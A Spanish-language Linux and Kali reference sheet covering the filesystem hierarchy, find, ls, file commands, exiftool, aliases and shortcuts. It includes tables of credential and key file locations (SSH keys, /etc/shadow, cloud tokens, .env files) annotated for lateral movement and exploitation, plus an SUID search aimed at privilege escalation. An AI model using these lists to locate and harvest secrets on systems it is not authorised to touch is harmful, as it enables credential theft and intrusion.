
### 🗃️ SISTEMA DE ARCHIVOS {#sistema-de-archivos}
  
FHS:
  
El Filesystem Hierarchy Standard (FHS) es un estándar que describe las convenciones utilizadas para la estructura de directorios en sistemas similares a Unix, incluyendo Linux. Este estándar ha sido adoptado y popularizado por su uso en distribuciones de Linux, aunque también es utilizado por otros sistemas operativos basados en Unix. El FHS es mantenido por la Linux Foundation, y la última versión es la 3.0, lanzada el 3 de junio de 2015.  
  
Desde su inicio como una iniciativa de Linux, el FHS ha sido adoptado por otros sistemas operativos derivados de Unix, aunque algunos de estos sistemas operativos han optado por desarrollar sus propias estructuras de directorios, que pueden variar significativamente. Por ejemplo, MacOS X utiliza nombres como /Applications, /Library y /Users, además de la jerarquía de directorios tradicional de Unix.  
  
En sistemas Unix y similares como BSD y GNU/Linux, todos los archivos y directorios están contenidos bajo el directorio raíz (/), independientemente de si se encuentran en diferentes dispositivos físicos. Aunque la mayoría de estos directorios existen en todos los sistemas operativos tipo Unix y se utilizan de manera similar, las descripciones proporcionadas por el FHS son específicas para este estándar y no son obligatorias en otras plataformas GNU/Linux.

### 🗃️ SISTEMA DE DIRECTORIOS (FHS) EN KALI LINUX

![Directorios_Kali.png](https://static.wixstatic.com/media/afa158_fc8332690a45482094dd3f140fc40ed9~mv2.png/v1/crop/x_0,y_0,w_1199,h_561/fill/w_960,h_449,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/Directorios_Kali.png)

Mostrar jerarquía del sistema en la terminal:  
```bash
man hier
```

Guardar jerarquía del sistema en archivo:
```bash
man hier > [archivo.txt]
```

### 🎯 RUTAS DE INTERÉS  
  
📂 Directorios principales (Kali Linux): 

| 📂 Directorio | 📝 Descripción                     |
| ------------- | ---------------------------------- |
| `.`           | Directorio actual                  |
| `~`           | Directorio home del usuario actual |
| `/`           | Raíz del sistema (root)            |

📂 Archivos importantes del sistema (Kali Linux): 

| 📂 Archivo             | 📝 Descripción                         |
| ---------------------- | -------------------------------------- |
| `/etc/passwd`          | Usuarios y grupos a los que pertenecen |
| `/etc/shadow`          | Contraseñas de usuarios                |
| `/etc/cron.d`          | Tareas cron                            |
| `/etc/default/useradd` | Parámetros por defecto de usuarios     |
| `/etc/group`           | Grupos de usuarios                     |
| `/etc/gshadow`         | Contraseñas de los grupos              |

⚠️ Directorios con permisos 1777 (Kali Linux): 

```bash
/var/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-haveged.service-NCCnDI/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-systemd-logind.service-S2AQ87/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-colord.service-t3rBkK/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-ModemManager.service-5N0X8d/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-upower.service-nWr0qe/tmp  
/var/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-polkit.service-7oFGKB/tmp  
/run/lock  
/run/screen  
/tmp  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-ModemManager.service-hwi4TC/tmp  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-colord.service-arI5Me/tmp  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-systemd-logind.service-dOKKaL/tmp  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-haveged.service-8XPD6b/tmp  
/tmp/.font-unix  
/tmp/.XIM-unix  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-polkit.service-cCb2On/tmp  
/tmp/.X11-unix  
/tmp/.ICE-unix  
/tmp/systemd-private-36568570a14f473b9bc4d8df9b2f7c16-upower.service-gu3tpf/tmp  
/dev/shm  
/dev/mqueue
```

⚠️ Directorios con permisos 755 (Kali Linux):  

```
/var/lib/AccountsService  
/var/lib/AccountsService/icons  
/var/lib/inetsim/http/postdata  
/var/lib/inetsim/ftp/upload  
/var/lib/inetsim/smtp  
/var/lib/inetsim/tftp/upload
```

Rutas de archivos sensibles de interés en Linux (👨USUARIO):  

| 📂 Ruta                              | 📝 Descripción                                              |
| ------------------------------------ | ----------------------------------------------------------- |
| `/home/usuario/.bash_history`        | Historial de comandos bash → puede revelar contraseñas      |
| `/home/usuario/.ssh/id_rsa`          | Clave privada SSH → acceso a otros sistemas                 |
| `/home/usuario/.ssh/authorized_keys` | Claves públicas autorizadas → pivoting                      |
| `/home/usuario/.ssh/known_hosts`     | Lista de hosts SSH conocidos → para moverte lateralmente    |
| `/home/usuario/.bashrc`              | Alias y funciones personalizadas → posibles credenciales    |
| `/home/usuario/.profile`             | Variables de entorno cargadas al login                      |
| `/home/usuario/.git-credentials`     | Credenciales HTTP de Git → a veces usuario:pass en texto    |
| `/home/usuario/.gnupg`               | Claves GPG privadas → cifrado y firmas                      |
| `/home/usuario/.netrc`               | Credenciales para FTP, HTTP → hosts, usuarios y contraseñas |
| `/home/usuario/.my.cnf`              | Configuración MySQL → usuario y contraseña para conexiones  |
| `/home/usuario/.pgpass`              | Contraseñas PostgreSQL → formato host:port:db:user:pass     |
| `/home/usuario/.npmrc`               | Tokens NPM → acceso a registries privados                   |
| `/home/usuario/.pypirc`              | Credenciales PyPI → usuario y contraseña para uploads       |
| `/home/usuario/.gem/credentials`     | Credenciales RubyGems → API keys para gems                  |
| `/home/usuario/.subversion/auth/`    | Credenciales Subversion → usuarios y contraseñas cached     |
| `/home/usuario/.mysql_history`       | Historial de comandos MySQL → queries con creds             |
| `/home/usuario/.psql_history`        | Historial de comandos PostgreSQL → similar a MySQL          |

Rutas de archivos sensibles de interés en Linux (⚙️ARCHIVOS DEL SISTEMA):  

| 📂 Archivo         | 📝 Descripción                                                          |
| ------------------ | ----------------------------------------------------------------------- |
| `/etc/passwd`      | Lista de usuarios del sistema. No contiene contraseñas                  |
| `/etc/shadow`      | Hashes de contraseñas → solo accesible como root                        |
| `/etc/group`       | Grupos del sistema → ver si el usuario está en sudo                     |
| `/etc/hostname`    | Nombre del host                                                         |
| `/etc/hosts`       | Mapeo IP ↔ nombre → puede revelar entornos internos                     |
| `/etc/resolv.conf` | Servidores DNS configurados                                             |
| `/etc/sudoers`     | Configuración de sudo → privilegios de usuarios                         |
| `/etc/fstab`       | Montajes de filesystems → posibles creds en opciones de mount (NFS/SMB) |
| `/etc/crontab`     | Cron jobs del sistema → scripts con comandos sensibles o creds          |
| `/etc/aliases`     | Aliases de email → redirecciones y usuarios                             |
| `/etc/os-release`  | Detalles del SO → versión y distribución para exploits                  |
| `/etc/lsb-release` | Información de distribución → similar a os-release                      |
| `/etc/issue`       | Mensaje de identificación del sistema → banners pre-login               |
| `/etc/motd`        | Message Of The Day → info personalizada post-login                      |

Rutas de archivos sensibles de interés en Linux (⚙️CONFIGURACIÓN DE SERVICIOS):  

| 📂 Archivo                    | 📝 Descripción                                                  |
| ----------------------------- | --------------------------------------------------------------- |
| `/etc/ssh/sshd_config`        | Configuración SSH → puede revelar usuarios `PermitRootLogin`    |
| `/etc/apache2/apache2.conf`   | Configuración Apache                                            |
| `/etc/nginx/nginx.conf`       | Configuración Nginx → posibles rutas ocultas                    |
| `/etc/mysql/my.cnf`           | Configuración MySQL → a veces incluye usuario y contraseña      |
| `/etc/postgresql/pg_hba.conf` | Autenticación PostgreSQL → métodos de auth y usuarios           |
| `/etc/redis/redis.conf`       | Configuración Redis → `requirepass` para contraseña             |
| `/etc/mongod.conf`            | Configuración MongoDB → auth, usuarios y roles                  |
| `/etc/php/php.ini`            | Configuración PHP → `expose_php`, `allow_url_fopen` con riesgos |
| `/etc/dovecot/dovecot.conf`   | Configuración email IMAP/POP → auth mechanisms con creds        |
| `/etc/postfix/main.cf`        | Configuración SMTP → relayhost con posibles creds               |
| `/etc/samba/smb.conf`         | Configuración Samba → shares con usuarios y contraseñas         |
| `/etc/ldap/ldap.conf`         | Configuración LDAP → binddn y bindpw para auth                  |
| `/var/www/html/config.php`    | Configuración de webs PHP → claves DB, API keys                 |
| `/var/www/html/.env`          | Variables de entorno web → claves API, DB, JWT                  |

Rutas de archivos sensibles de interés en Linux (💾ARCHIVOS DE LOGS):  

| 📂 Archivo                           | 📝 Descripción                                             |
| ------------------------------------ | ---------------------------------------------------------- |
| `/var/log/auth.log`                  | Logins exitosos y fallidos → bruteforce detectado          |
| `/var/log/secure`                    | Igual que auth.log (en RedHat)                             |
| `/var/log/apache2/access.log`        | Peticiones web → puede revelar parámetros y ataques        |
| `/var/log/apache2/error.log`         | Errores web → paths internos, errores SQL                  |
| `/var/log/mysql/error.log`           | Errores de MySQL → usuarios y contraseñas a veces          |
| `/var/log/syslog`                    | Logs generales del sistema → eventos variados              |
| `/var/log/messages`                  | Mensajes del sistema → similar a syslog en algunas distros |
| `/var/log/kern.log`                  | Logs del kernel → hardware y drivers sensibles             |
| `/var/log/dmesg`                     | Mensajes de boot → dispositivos y configs iniciales        |
| `/var/log/nginx/access.log`          | Peticiones Nginx → similar a Apache access                 |
| `/var/log/nginx/error.log`           | Errores Nginx → leaks de info interna                      |
| `/var/log/postgresql/postgresql.log` | Logs PostgreSQL → queries y errores con creds              |
| `/var/log/redis/redis.log`           | Logs Redis → conexiones y comandos sensibles               |
| `/var/log/cron`                      | Logs de cron jobs → ejecuciones fallidas con detalles      |
| `/var/log/audit/audit.log`           | Logs de auditoría → eventos de seguridad detallados        |

Rutas de archivos sensibles de interés en Linux (​🪪​CREDENCIALES Y API KEYS):  

| 📂 Archivo                                                    | 📝 Descripción                                      |
| ------------------------------------------------------------- | --------------------------------------------------- |
| `/var/www/html/.env`                                          | Variables de entorno → API keys, DB credentials     |
| `/var/www/html/wp-config.php`                                 | Configuración WordPress → DB usuario y contraseña   |
| `/var/www/html/config.php`                                    | Configuración genérica → a veces claves duras       |
| `/var/www/html/.htpasswd`                                     | Archivos de contraseñas HTTP Basic Auth             |
| `/var/www/html/.git/config`                                   | URLs de repositorios → puede contener tokens        |
| `/etc/environment`                                            | Variables de entorno system-wide → posibles secrets |
| `/etc/jenkins/jenkins.model.JenkinsLocationConfiguration.xml` | Config Jenkins → URLs y creds                       |
| `/var/www/html/laravel/.env`                                  | Env Laravel → app keys, DB creds                    |
| `/var/www/html/drupal/sites/default/settings.php`             | Config Drupal → DB y site keys                      |
| `/home/usuario/.env`                                          | Env user-specific → creds locales                   |
| `/home/usuario/.composer/auth.json`                           | Credenciales Composer → tokens GitHub/Packagist     |
| `/home/usuario/.maven/settings.xml`                           | Config Maven → server creds para repos              |

Rutas de archivos sensibles de interés en Linux (🔑CLAVES Y TOKENS):  

| 📂 Archivo                                       | 📝 Descripción                                   |
| ------------------------------------------------ | ------------------------------------------------ |
| `/root/.ssh/id_rsa`                              | Clave privada SSH root                           |
| `/etc/ssl/private/`                              | Claves privadas SSL                              |
| `/home/usuario/.aws/credentials`                 | Credenciales AWS → acceso cloud                  |
| `/home/usuario/.docker/config.json`              | Tokens Docker → acceso a registries privados     |
| `/home/usuario/.ssh/id_rsa`                      | Clave Privada de OpenSSH                         |
| `/home/usuario/.kube/config`                     | Config Kubernetes → tokens y certs para clusters |
| `/home/usuario/.config/gcloud/credentials.db`    | Credenciales Google Cloud → access tokens        |
| `/home/usuario/.azure/config.json`               | Config Azure → subscription IDs y keys           |
| `/home/usuario/.config/digitalocean/config.json` | Tokens DigitalOcean → API access                 |
| `/home/usuario/.terraformrc`                     | Config Terraform → provider creds                |
| `/home/usuario/.config/heroku/credentials`       | Credenciales Heroku → API keys                   |
| `/home/usuario/.vault-token`                     | Tokens Vault → secrets management                |
| `/etc/letsencrypt/live`                          | Claves y certs Let's Encrypt → dominios          |

Rutas de archivos sensibles de interés en Linux (OTROS):  

| 📂 Archivo                  | 📝 Descripción                                            |
| --------------------------- | --------------------------------------------------------- |
| `/proc/self/environ`        | Variables de entorno del proceso actual                   |
| `/proc/net/tcp`             | Conexiones TCP activas → puede revelar servicios internos |
| `/proc/cmdline`             | Parámetros del kernel al arrancar → posibles creds        |
| `/proc/sched_debug`         | Información detallada de procesos → a veces sensible      |
| `/proc/self/cmdline`        | Command line del proceso actual → args con datos          |
| `/proc/mounts`              | Filesystems montados → tipos y opciones con creds         |
| `/sys/class/net/`           | Interfaces de red → MAC, IPs, configs                     |
| `/var/spool/cron/crontabs/` | Crontabs de usuarios → jobs con scripts y creds           |
| `/etc/cron.d/`              | Directorios cron → jobs programados con info              |
| `/etc/init.d/`              | Scripts de init → comandos de startup con creds           |
| `/proc/cpuinfo`             | Detalles de CPU → para fingerprinting hardware            |
| `/proc/meminfo`             | Info de memoria → uso y límites                           |
| `/etc/security/limits.conf` | Límites de recursos → configs de usuarios                 |

### 🔎 LOCATE

Locate:
| #️⃣ Comando               | 📝 Descripción                                                  |
| --------------------------- | --------------------------------------------------------------- |
| `sudo updatedb`             | Actualizar manualmente la base de datos de archivos del sistema |
| `locate [término a buscar]` | Busca el término dado en TODO el sistema                        |
  
Binarios: 
| #️⃣ Comando       | 📝 Descripción                                                  |
| ------------------- | --------------------------------------------------------------- |
| `which [binario]`   | Busca ruta absoluta de un binario del sistema                   |
| `whereis [binario]` | Busca ruta absoluta, fuente y manpage de un binario del sistema |

### 🔎  FIND 
  
El comando find en Linux es una herramienta poderosa y versátil para buscar archivos y directorios en el sistema. 
   
Ejemplos en diferentes directorios: 
| #️⃣ Comando       | 📝 Descripción                                                          |
| ------------------- | ----------------------------------------------------------------------- |
| `find . -name file` | Buscar archivo con nombre "file" desde el directorio actual             |
| `find ~ -name file` | Buscar archivo con nombre "file" desde el directorio del usuario actual |
| `find / -name file` | Buscar archivo con nombre "file" desde la raíz del sistema              |
  
Buscar por tipo de archivo: 
| #️⃣ Comando           | 📝 Descripción            |
| ----------------------- | ------------------------- |
| `find / -type f`        | Buscar archivos           |
| `find / -type d`        | Buscar directorios        |
| `find / -type d -empty` | Buscar directorios vacíos |
  
Buscar por tiempo: 
| #️⃣ Comando              | 📝 Descripción                             |
| -------------------------- | ------------------------------------------ |
| `find / -type f -mtime -7` | Archivos modificados en los últimos 7 días |
  
Buscar por tamaño: 
| #️⃣ Comando               | 📝 Descripción                       |
| --------------------------- | ------------------------------------ |
| `find / -type f -size 10c`  | Buscar archivos de 10 bytes          |
| `find / -type f -size +10c` | Buscar archivos de más de 10 bytes   |
| `find / -type f -size -10c` | Buscar archivos de menos de 10 bytes |
| `find / -type f -size 10k`  | Buscar archivos de 10 kilobytes      |
| `find / -type f -size 10M`  | Buscar archivos de 10 megabytes      |
| `find / -type f -size 10G`  | Buscar archivos de 10 gigabytes      |
  
Buscar por nombre de usuario o grupo: 
| #️⃣ Comando                    | 📝 Descripción                        |
| -------------------------------- | ------------------------------------- |
| `find / -type f -user [usuario]` | Buscar archivos por nombre de usuario |
| `find / -type f -group [grupo]`  | Buscar archivos por nombre de grupo   |
  
Buscar por permisos: 
| #️⃣ Comando              | 📝 Descripción                                                            |
| -------------------------- | ------------------------------------------------------------------------- |
| `find / -type f -perm 777` | Archivos con plenos permisos para todos los usuarios                      |
| `find / -type f -perm 755` | Archivos con plenos permisos para root, y lectura/ejecución para el resto |
| `find / -type f -perm 700` | Archivos con plenos permisos para root, y ningún permiso para el resto    |
| `find / -readable`         | Archivos con permisos de lectura para el usuario actual                   |
| `find / -writable`         | Archivos con permisos de escritura para el usuario actual                 |
| `find / -executable`       | Archivos con permisos de ejecución para el usuario actual                 |
  
Buscar por nombre parcial. * significa cualquier caracter. Atención al sentido de la barra \ : 
| #️⃣ Comando        | 📝 Descripción                                                   |
| -------------------- | ---------------------------------------------------------------- |
| `find / -name "Pu*"` | El nombre del archivo o directorio buscado debe empezar por "Pu" |
  
Condicionales: 
| #️⃣ Operador | 📝 Descripción                                              |
| -------------- | ----------------------------------------------------------- |
| `-and`         | Resultados de búsqueda deben cumplir ambas condiciones      |
| `-or`          | Resultados de búsqueda deben cumplir al menos una condición |
| `-not`         | Para negar la condición posterior                           |
  
Permite ejecutar un comando en cada archivo que encuentre:  
```bash
-exec
```
  
Pipe para mostrar también archivos ocultos en la búsqueda:  
```bash
| xargs ls -la
```
  
Para filtrar el output y descartar el stderr, añadir al final:  
```bash
2>/dev/null
```

Buscar un término desde la raíz, filtrando resultados que NO vengan acompañados de "Permission denied":
```bash
find / -name pepe 2>&1 | grep -v "Permission denied"
```

Buscar archivos con el bit SUID desde la raíz (el bit SUID activo permite que cualquier usuario pueda ejecutarlos como root):
```bash
find / -perm -4000 2>/dev/null
```
Buscar binarios vulnerables en GTFOBins:
🌐 [https://gtfobins.github.io](https://gtfobins.github.io/)

### 📝 LISTAR CONTENIDO  
  
| #️⃣ Comando                          | 📝 Descripción |
|---------------------------------------|---------------|
| `ls`                                  | Lista contenido del directorio actual |
| `ls /Home/carpeta`                    | Lista contenido del directorio dado |
| `ls -l`                               | Lista contenido detallado |
| `ls -la`                              | Lista contenido detallado + archivos ocultos |
| `ls -hog`                             | Lista contenido detallado compacto |
| `ls -r`                               | Lista contenido en orden alfabético inverso |
| `ls -R`                               | Lista contenido recursivo (todos los subdirectorios) |
| `ls Documents -R`                     | Lista recursiva de un directorio concreto |
| `ls -s`                               | Lista contenido mostrando tamaño en bloques |
| `ls -S`                               | Lista contenido ordenado por tamaño |
| `ls -d */`                            | Lista solo los directorios |
| `ls -t`                               | Lista contenido por fecha (más recientes primero) |
| `ls -1`                               | Lista contenido en formato vertical |
| `ls > [archivo]`                      | Guarda el listado en un archivo |
| `ls -l > [archivo]`                   | Guarda el listado detallado en un archivo |
| `ls -ltr`                             | Lista detallada por fecha (más antiguos primero) |
| `ls ../`                              | Lista contenido del directorio anterior |
| `tree`                                | Muestra árbol de directorios y subdirectorios |
| `ls -a \| xargs realpath`             | Muestra las rutas completas de los archivos |

### 📁 CAMBIAR DIRECTORIO  
  
| #️⃣ Comando              | 📝 Descripción |
|---------------------------|---------------|
| `cd /home/Music`          | Ir al directorio dado |
| `cd ..`                   | Subir un nivel (directorio anterior) |
| `cd ../..`                | Subir dos niveles |
| `cd ../../..`             | Subir tres niveles |
| `cd /`                    | Ir al directorio root (raíz) |
| `cd ~`                    | Ir al directorio home del usuario actual |
| `cd !$`                   | Ir al último directorio creado (con `mkdir`) |

### 📁 MODIFICAR ARCHIVOS Y DIRECTORIOS  
  
Crear nuevo:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `touch [archivo]`             | Crear archivo nuevo |
| `mkdir [directorio]`          | Crear directorio nuevo |
  
Copiar:  
| #️⃣ Comando                          | 📝 Descripción |
|-------------------------------------|---------------|
| `cp [archivo] [copia]`              | Copiar archivo con nuevo nombre |
| `cp [archivo] /tmp/guest`           | Copiar archivo a una ruta específica |
| `cp /tmp/guest [archivo]`           | Copiar archivo desde ruta a directorio actual |
  
Borrar:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `rm [archivo]`                | Borrar archivo |
| `rmdir [directorio]`          | Borrar directorio vacío |
| `rm -r [directorio]`          | Borrar directorio y su contenido |
| `rm -rf [directorio]`         | Borrar directorio y contenido sin confirmación |
| `rm -ri [directorio]`         | Borrar directorio preguntando por cada archivo |
  
Mover:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `mv [archivo] /tmp/guest`     | Mover archivo a la ruta indicada |
  
Cambiar nombre:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `mv [archivo1] [archivo2]`    | Renombrar archivo1 a archivo2 |
  
Asociar archivo con nº de indicativo:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `exec 1<> [archivo]`          | Asociar archivo al descriptor 1 (lectura y escritura) |
| `exec 1< [archivo]`           | Asociar archivo al descriptor 1 (solo lectura) |
| `exec 1> [archivo]`           | Asociar archivo al descriptor 1 (solo escritura) |
| `echo blabla >&1`             | Redirigir salida al descriptor 1 |
| `exec 2>&1`                   | Redirigir stderr (2) a stdout (1) |
| `exec 1>&-`                   | Cerrar asociación del descriptor 1 |

### 📑 CAT Y SIMILARES  
  
Ejecutar ejecutables (.sh):
| #️⃣ Comando       | 📝 Descripción              |
|------------------|-----------------------------|
| `./[archivo]`    | Ejecutar el archivo         |
  
Cat:  
| #️⃣ Comando                        | 📝 Descripción |
|-----------------------------------|---------------|
| `cat [archivo]`                   | Abrir archivo como texto |
| `cat ./[archivo]`                 | Abrir archivo como texto (ruta relativa) |
| `cat "[archivo 1]"`               | Abrir archivo con espacios en el nombre |
| `cat *`                           | Abrir todos los archivos del directorio actual |
| `cat [archivo0*]`                 | Abrir archivos similares (file01, file02...) |
| `cat /home/archivo`               | Abrir archivo de ruta absoluta |

Sort:
| #️⃣ Comando               | 📝 Descripción |
|---------------------------|---------------|
| `sort [archivo]`          | Ordenar alfabéticamente |
| `sort -r [archivo]`       | Orden inverso alfabético |
| `sort -R [archivo]`       | Orden aleatorio |
| `sort -k3 [archivo]`      | Ordenar por el tercer campo |
| `sort -n [archivo]`       | Ordenar valores numéricos |
  
Strings:  
| #️⃣ Comando                        | 📝 Descripción |
|-----------------------------------|---------------|
| `strings [archivo]`               | Mostrar cadenas imprimibles de archivos binarios |
| `strings -a [archivo]`            | Analizar todo el archivo (no solo secciones de datos) |
| `strings -d [archivo]`            | Mostrar solo cadenas de secciones de datos inicializadas |
| `strings -n [nº] [archivo]`       | Establecer longitud mínima de caracteres |
| `strings -t RADIX [archivo]`      | Mostrar desplazamientos (offsets) de las cadenas | 
  
Otros:  
| #️⃣ Comando                    | 📝 Descripción |
|-------------------------------|---------------|
| `head [archivo]`              | Mostrar las 10 primeras líneas |
| `tail [archivo]`              | Mostrar las 10 últimas líneas |
| `diff [archivo1] [archivo2]`  | Comparar dos archivos y resaltar diferencias |
| `nl [archivo]`                | Mostrar contenido numerando las líneas |
| `more [archivo]`              | Navegar por el contenido página a página |
| `less [archivo]`              | Navegar por el contenido con flechas (mejorado) |
| `tac [archivo]`               | Mostrar contenido de fin a principio |
| `rev [archivo]`               | Mostrar contenido del revés (caracteres invertidos) |
| `uniq [archivo]`              | Eliminar líneas repetidas |
| `uniq -c [archivo]`           | Contar cuántas veces se repite cada línea |
| `uniq -d [archivo]`           | Mostrar solo las líneas que se repiten |
| `wc -m [archivo]`             | Contar número de caracteres |
| `wc -l [archivo]`             | Contar número de líneas |

### 📊 EXIFTOOL  
  
ExifTool es una herramienta de código abierto construida en Perl por Phil Harvey, diseñada para leer, escribir y manipular metadatos en una amplia variedad de tipos de archivos. EXIF, que significa Exchangeable Image File Format, se utiliza principalmente para incluir metadatos en varios tipos de archivos como txt, png, jpeg, pdf, HTML, entre otros. Con ExifTool, puedes realizar tareas como clasificar imágenes en carpetas según su fecha de creación, renombrar archivos de imagen según su fecha de creación, extraer metadatos específicos, editar metadatos existentes, guardar metadatos en un archivo de texto para su uso posterior, y eliminar todos los metadatos de un archivo, dejando solo la información básica o protegida.  
  
🌐 [https://exiftool.org](https://exiftool.org/)  
  
Instalación:
```
sudo apt install exiftool
```
  
VISIONAR metadatos de un archivo:
```
exiftool [archivo]
```
  
Ver menú de ayuda:
```
exiftool -h
```
  
ESCRIBIR metadatos en un archivo:
```
-[nombre_del_metadato]="valor" [nombre_de_archivo]
```
Ejemplo:
```
exiftool -DateTimeOriginal="2024:04:15 12:00:00" [archivo]
```
  
ELIMINAR todos los metadatos de un archivo:
```
exiftool -all= [nombre_de_archivo]
```
Ejemplo:
```
exiftool -all= [archivo]
```

### 🖥️ INTERFAZ  
  
Interfaz de usuario (por defecto en /home/usuario):
```
(usuario㉿kali)-[~]  
$_
```
   
Interfaz de superusuario (por defecto en /root):
```
(root㉿kali)-[~]  
#_
```

### 🖥️ COMANDOS DE TERMINAL  
  
Comandos:  
| #️⃣ Comando     | 📝 Descripción |
|-----------------|---------------|
| `clear`         | Limpiar la terminal |
| `reset`         | Resetear la terminal |
| `reboot`        | Reiniciar el sistema |
   
Con Shutdown:  
| #️⃣ Comando              | 📝 Descripción |
|--------------------------|---------------|
| `shutdown -h now`        | Apagar el sistema inmediatamente |
| `shutdown -h 20`         | Apagar el sistema en 20 minutos |
| `shutdown -r now`        | Reiniciar el sistema inmediatamente |
| `shutdown -r 20`         | Reiniciar el sistema en 20 minutos |

### ⌨️ ATAJOS DE TECLADO  
  
Movimiento de cursor:  
| #️⃣ Atajo                        | 📝 Descripción |
|---------------------------------|---------------|
| `[←]` `[→]`                     | Mover cursor lateralmente |
| `[Ctrl] + [A]`                  | Mover cursor al inicio de línea |
| `[Inicio]`                      | Mover cursor al inicio de línea |
| `[Ctrl] + [E]`                  | Mover cursor al final de línea |
| `[Fin]`                         | Mover cursor al final de línea |
| `[Alt] + [B]`                   | Retroceder una palabra |
| `[Alt] + [F]`                   | Avanzar una palabra |
  
Portapapeles:  
| #️⃣ Atajo                        | 📝 Descripción |
|---------------------------------|---------------|
| `[Ctrl] + [Shift] + [C]`        | Copiar texto seleccionado |
| `[Ctrl] + [Shift] + [X]`        | Cortar texto seleccionado |
| `[Ctrl] + [Shift] + [V]`        | Pegar texto del portapapeles | 
  
Terminal:  
| #️⃣ Atajo                        | 📝 Descripción |
|---------------------------------|---------------|
| `[Alt] + [T]`                   | Abrir nueva terminal |
| `[Ctrl] + [L]`                  | Limpiar la terminal |
| `[Ctrl] + [U]`                  | Limpiar la línea de comandos |
| `[Ctrl] + [C]`                  | Detener y cerrar aplicación en curso |
| `[Ctrl] + [Z]`                  | Pasar a segundo plano la aplicación |
| `[Ctrl] + [D]`                  | Cerrar el terminal |
| `[Ctrl] + [Shift] + [D]`        | Dividir terminal horizontalmente |
| `[Ctrl] + [Shift] + [R]`        | Dividir terminal verticalmente |
| `[Ctrl] + [Shift] + [E]`        | Cerrar la división actual |
| `[Ctrl] + [-]`                  | Reducir tamaño de letra |
| `[Ctrl] + [+]`                  | Aumentar tamaño de letra |
  
Texto:  
| #️⃣ Atajo                  | 📝 Descripción |
|---------------------------|---------------|
| `[↑]`                     | Imprimir último comando ejecutado |
| `[↓]`                     | Imprimir siguiente comando |
| `[Tab]`                   | Autocompletar comando o línea |
| `[⇐]`                     | Borrar moviendo cursor hacia atrás |
| `[Supr]`                  | Borrar moviendo cursor hacia delante |
| `[Ctrl] + [K]`            | Borrar línea desde el cursor |
| `[Ctrl] + [U]`            | Borrar línea hasta el cursor |

### 🏷️​ EXPORT  
  
Se utiliza para definir variables de entorno en el shell actual. Las variables de entorno son pares clave-valor que proporcionan información adicional al sistema operativo y a los programas que se ejecutan en él. Al exportar una variable, se hace disponible para procesos hijos del shell actual, lo que significa que los scripts y programas que se ejecuten desde ese shell podrán acceder a esa variable. Las variables de entorno definidas en una terminal solo estarán operativas en dicha terminal, mientras se mantenga abierta.  
  
Definir una variable de entorno:
```
export saludo=Hello
```
  
Hacer uso de la variable de entorno definida:  
```
echo $saludo  
Hello
```
  
EJEMPLO DE USO. Definir una variable de entorno para sustituir una IP:
```
export ip=192.168.1.1
  
echo $ip  
192.168.1.1
```
  
Mostrar en terminal las variables de entorno de la sesión actual:
```
env
```

### 🅰️ ALIAS  
  
Definir un ALIAS Temporal para el Usuario Actual (se borrará al cerrar la terminal):
```
alias [nombre_alias]="[comando]"
```
  
Ejemplo:
```
alias ip-public="curl config.me"
  
ip-public  
10.100.100.10
```
  
Listar por terminal los ALIAS Temporales del Usuario Actual:
```
alias

diff='diff --color=auto'  
egrep='egrep --color=auto'  
fgrep='fgrep --color=auto'  
grep='grep --color=auto'  
history='history 0'  
ip='ip --color=auto'  
l='ls -CF'  
la='ls -A'  
ll='ls -l'  
ls='ls --color=auto'  
which-command=whence
```

Eliminar un ALIAS del Usuario Actual:
```
unalias
```
  
Abrir archivo de ALIAS Permanentes del Usuario Actual en cada SHELL:
```
mousepad ~/.zshrc  
mousepad ~/.bashrc
```
  
Tanto en ~/.zshrc como en ~/.bashrc los ALIAS Permanentes se encuentran al final del archivo programados como:
```
alias ex='example'
```
  
Listar por terminal los ALIAS Permanentes del Usuario Actual en ZSH:
```
grep 'alias' ~/.zshrc ~/.zsh_profile ~/.zsh_aliases
```
   
Listar por terminal los ALIAS Permanentes del Usuario Actual en BASH:
```
grep 'alias' ~/.bashrc ~/.bash_profile ~/.bash_aliases
```
  
Listar por terminal los ALIAS Permanentes de Root en ZSH:
```
sudo grep 'alias' /root/.zshrc /root/.zsh_profile /root/.zsh_aliases
```  
  
Listar por terminal los ALIAS Permanentes de Root en BASH:
```
sudo grep 'alias' /root/.bashrc /root/.bash_profile /root/.bash_aliases
```

### 1️⃣ ALGUNOS ONE-LINERS ÚTILES
  
Reemplazar los espacios por guiones bajos en los nombres de todos los archivos del directorio actual:
```
rename 'y/ /_/' *
```
  
Pasar a minúsculas los nombres de todos los archivos del directorio actual:
```
rename 'y/A-Z/a-z' *
```
  
Crear contraseña fuerte y aleatoria de 15 caracteres:
```
head -c 15 /dev/urandom | md5sum | base64 | head -c 15; echo  
alias new-pass1='head -c 15 /dev/urandom | md5sum | base64 | head -c 15; echo'
```
```
LC_ALL=C tr -dc 'A-Za-z0-9?' </dev/urandom | head -c 15  
alias new-pass2='LC_ALL=C tr -dc 'A-Za-z0-9?' </dev/urandom | head -c 15'
``` 
  
Ver parte meteorológico de una ciudad (Madrid):
```
curl wttr.in/madrid
```
  
Salvapantallas de terminal estilo Matrix:
```
tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"  
alias matrix='tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"'
```
  
Salvapantallas de terminal que imita actividad:
```
cat /dev/urandom |  hexdump -C |  grep "ca fe"  
